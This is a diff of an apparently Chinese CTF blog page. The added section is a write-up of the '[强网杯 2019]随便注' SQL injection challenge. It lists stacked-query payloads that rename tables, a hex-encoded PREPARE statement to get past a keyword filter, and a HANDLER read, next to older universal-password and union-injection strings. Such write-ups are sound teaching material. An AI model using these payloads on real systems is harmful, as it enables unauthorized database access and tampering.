@@ -405,6 +405,8 @@
 <td>FOREIGN KEY</td>
 </tr>
 </tbody></table>
+<p>1’;ALTER TABLE words RENAME TO word1;ALTER TABLE <code>1919810931114514</code> RENAME TO words;alter table words change flag id varchar(100);</p>
+<p>1’;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p>
 
           
         
@@ -1398,6 +1400,19 @@
 
 <h2 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h2><p>万能密码：’or 1&#x3D;1 #</p>
 <h3 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h3><p><strong>判断列数</strong><br><code>&#39; or 1=1 order by 3#</code><br><strong>判断显示位</strong><br><code>&#39; union select 1,2 #</code><br>后面和get型相同<br>‘union select 1,database()#  </p>
+<h2 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h2><p><strong>法一</strong><br>提取到的关键信息：select关键字被过滤，输入数字1查询的内容是words<br>思路：将words改名为其余的名字，将表1919810931114514改名为words，将flag字段改名为id，类型为varchar(100)<br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;ALTER TABLE words RENAME TO word1;ALTER TABLE `1919810931114514` RENAME TO words;alter table words change flag id varchar(100);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>
+<p>个人理解：在后台的查询语句是…where id&#x3D;’’，所以将flag名字改成id，或者可以添加一个id字段，不然查询语句会出错，然后使用万能密码来匹配查询所有words表数据，里面就是flag</p>
+<p><strong>法二</strong><br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure>
+<p>mysql中SET是SQL Server中对已经定义的变量赋值的方式,@是变量定义符，prepare将@a赋给execsql，prepare会进行编码转换，可以避开select<br>PREPARE语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE statement_name FROM sql_text /*定义*/</span><br><span class="line">EXECUTE statement_name [USING variable [,variable...]] /*执行预处理语句*/   </span><br><span class="line">DEALLOCATE PREPARE statement_name /*删除定义*/   </span><br></pre></td></tr></table></figure>
+<p>16进制的sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `1919810931114514`;</span><br></pre></td></tr></table></figure>
+<p><strong>法三</strong><br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure>
+<p>使用一个句柄（handler）来操作数据库。句柄 1919810931114514 被打开并用作句柄 a。然后，a 执行 read next 命令，用于从数据库中读取下一条记录</p>
 
           
         
